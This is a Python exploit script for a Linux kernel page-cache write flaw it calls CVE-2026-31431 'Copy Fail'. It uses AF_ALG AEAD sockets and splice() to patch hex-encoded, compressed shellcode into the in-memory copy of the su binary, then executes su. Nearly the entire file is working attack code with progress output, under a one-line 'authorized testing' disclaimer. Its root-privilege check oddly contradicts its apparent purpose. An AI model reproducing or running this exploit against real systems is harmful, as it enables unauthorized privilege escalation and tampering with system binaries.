#!/usr/bin/env python3
"""
CVE-2026-31431 "Copy Fail" Exploit
Python 3.5+ compatible (includes splice() syscall wrapper)

This exploit targets a Linux kernel vulnerability in the authencesn AEAD
cryptographic implementation that allows arbitrary writes to the page cache.

For authorized security testing only.
"""
import os
import zlib
import socket
import ctypes
import ctypes.util
import sys
import errno

# Check Python version
if sys.version_info < (3, 5):
    print("[-] This script requires Python 3.5 or higher")
    sys.exit(1)

# Check if running as root
if os.geteuid() != 0:
    print("[-] This exploit requires root privileges")
    print("[*] Please run with: sudo python3 expfix.py")
    sys.exit(1)

# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Define off64_t type (loff_t in kernel)
class off64_t(ctypes.c_int64):
    pass

# Configure splice() syscall signature
libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(off64_t),
    ctypes.c_int, ctypes.POINTER(off64_t),
    ctypes.c_size_t, ctypes.c_uint
]
libc.splice.restype = ctypes.c_ssize_t

def splice(src, dst, count, offset_src=None, offset_dst=None):
    """
    Wrapper for splice() syscall matching Python os.splice() API
    """
    p_off_src = ctypes.pointer(off64_t(offset_src)) if offset_src is not None else None
    p_off_dst = ctypes.pointer(off64_t(offset_dst)) if offset_dst is not None else None
    result = libc.splice(src, p_off_src, dst, p_off_dst, count, 0)
    if result < 0:
        raise OSError("splice() failed with return code {}".format(result))
    return result

def d(x):
    """Decode hex string"""
    return bytes.fromhex(x)

def check_af_alg_support():
    """Check if AF_ALG is supported"""
    try:
        # Try to create an AF_ALG socket
        test_sock = socket.socket(38, 5, 0)
        test_sock.close()
        return True
    except Exception as e:
        print("[-] AF_ALG not supported: {}".format(str(e)))
        return False

def get_available_alg():
    """Try different algorithm names that might work"""
    algorithms = [
        "authencesn(hmac(sha256),cbc(aes))",
        "authenc(hmac(sha256),cbc(aes))", 
        "gcm(aes)",
        "ccm(aes)",
        "rfc4106(gcm(aes))"
    ]
    
    for alg in algorithms:
        try:
            sock = socket.socket(38, 5, 0)
            sock.bind(("aead", alg))
            sock.close()
            print("[+] Found working algorithm: {}".format(alg))
            return alg
        except Exception:
            continue
    
    return None

def c(f, t, payload):
    """
    Core exploitation function
    f: target file descriptor
    t: offset in target file
    payload: 4 bytes to write at offset
    """
    try:
        # Create AF_ALG socket
        a = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
        
        # Try to bind with a working algorithm
        alg_name = get_available_alg()
        if alg_name is None:
            raise Exception("No working AEAD algorithm found")
        
        a.bind(("aead", alg_name))
        
        h = 279  # SOL_ALG
        v = a.setsockopt
        
        # Set AEAD key
        v(h, 1, d('0800010000000010' + '0'*64))  # ALG_SET_KEY
        
        # Set AEAD authsize
        v(h, 5, None, 4)  # ALG_SET_AEAD_AUTHSIZE
        
        # Accept operation socket
        u, _ = a.accept()
        
        o = t + 4  # Offset calculation
        zero_byte = d('00')  # Zero byte
        
        # Send message with ancillary data
        u.sendmsg(
            [b"A"*4 + payload],
            [
                (h, 3, zero_byte*4),           # ALG_SET_IV
                (h, 2, b'\x10' + zero_byte*19), # ALG_SET_OP
                (h, 4, b'\x08' + zero_byte*3),  # ALG_SET_AEAD_ASSOCLEN
            ],
            32768
        )
        
        # Create pipe for splice
        r, w = os.pipe()
        
        # Splice file into pipe, then pipe into socket
        splice(f, w, o, offset_src=0)
        splice(r, u.fileno(), o)
        
        # Trigger processing
        try:
            u.recv(8 + t)
        except:
            pass
        
        u.close()
        a.close()
        
    except OSError as e:
        if e.errno == errno.EAFNOSUPPORT:
            print("[-] AF_ALG not supported by this kernel")
            print("[*] Make sure you're running on a vulnerable Linux kernel")
            sys.exit(1)
        elif e.errno == errno.EACCES:
            print("[-] Permission denied for AF_ALG operation")
            print("[*] Run with sudo: sudo python3 expfix.py")
            sys.exit(1)
        else:
            raise

# Target the su binary
TARGET_BINARY = "/bin/su"
FALLBACK_TARGET = "/usr/bin/su"

def set_target():
    """Determine which su binary exists and should be targeted"""
    if os.path.exists(TARGET_BINARY):
        return TARGET_BINARY
    elif os.path.exists(FALLBACK_TARGET):
        return FALLBACK_TARGET
    else:
        raise FileNotFoundError("Could not find su binary. Tried: {}, {}".format(
            TARGET_BINARY, FALLBACK_TARGET))

# Main exploit
print("[*] CVE-2026-31431 Copy Fail Exploit")
print("[*] Python version: {}".format(sys.version.split()[0]))
print("[*] Running as root: Yes")

# Check AF_ALG support
if not check_af_alg_support():
    print("[-] AF_ALG is not supported by your kernel")
    print("[*] This exploit requires a Linux kernel with CONFIG_CRYPTO_USER_API_AEAD=y")
    sys.exit(1)

target_path = set_target()
print("[*] Target: {}".format(target_path))
print("")

try:
    # Open target file
    f = os.open(target_path, os.O_RDONLY)
    print("[+] Opened {} (fd={})".format(target_path, f))
except PermissionError:
    print("[-] Permission denied opening target file")
    sys.exit(1)
except FileNotFoundError:
    print("[-] Target {} not found.".format(target_path))
    sys.exit(1)

# Decompress shellcode
i = 0
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

print("[+] Shellcode size: {} bytes".format(len(e)))
print("[+] Patching {} in page cache...".format(target_path))

# Write shellcode 4 bytes at a time
try:
    while i < len(e):
        c(f, i, e[i:i+4])
        i += 4
        if i % 16 == 0:
            print("    Written {}/{} bytes...".format(i, len(e)))
except KeyboardInterrupt:
    print("\n[-] Interrupted by user")
    sys.exit(1)
except Exception as e:
    print("[-] Error during exploitation: {}".format(str(e)))
    print("[*] The target system may not be vulnerable to CVE-2026-31431")
    sys.exit(1)

print("[+] Page cache patching complete!")
print("[+] Executing modified su...")
print("")

# Execute patched su
os.system("su")
